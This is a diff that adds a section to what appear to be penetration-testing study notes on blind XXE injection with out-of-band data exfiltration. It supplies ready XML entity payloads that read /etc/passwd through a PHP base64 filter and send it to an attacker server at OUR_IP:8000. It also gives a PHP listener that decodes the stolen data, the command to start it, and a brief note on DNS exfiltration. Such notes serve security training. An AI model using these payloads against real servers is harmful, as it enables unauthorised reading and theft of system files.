@@ -151,5 +151,38 @@ and then call this in the request:
   %error;
 ]>
 ```
+### Blind Data Exfiltration
+
+#### Out-of-band Data Exfiltration
+If we have no way to have anything printed on the web application response, we can try to make the web application send a web request to our web server with the content of the file we are reading. To do so, we can first use a parameter entity for the content of the file we are reading while utilizing PHP filter to base64 encode it. Then, we will create another external parameter entity and reference it to our IP, and place the file parameter value as part of the URL being requested over HTTP, as follows:
+```
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
+```
+When the XML tries to reference the external oob parameter from our machine, it will request `http://OUR_IP:8000/?content=<base64_encoded_content>` and we can decode the content value. <br>
+We can even write a simple PHP script that automatically does that. Put this into `index.php`:
+```
+<?php
+if(isset($_GET['content'])){
+    error_log("\n\n" . base64_decode($_GET['content']));
+}
+?>
+```
+and start PHPH server:
+```
+php -S 0.0.0.0:8000
+```
+Then we can initiate our attack with a payload like this:
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %remote;
+  %oob;
+]>
+<root>&content;</root>
+```
+*Note: In addition to storing our base64 encoded data as a parameter to our URL, we may utilize DNS OOB Exfiltration by placing the encoded data as a sub-domain for our URL (e.g. ENCODEDTEXT.our.website.com), and then use a tool like tcpdump to capture any incoming traffic and decode the sub-domain string to get the data. Granted, this method is more advanced and requires more effort to exfiltrate data through.*
+
 
 
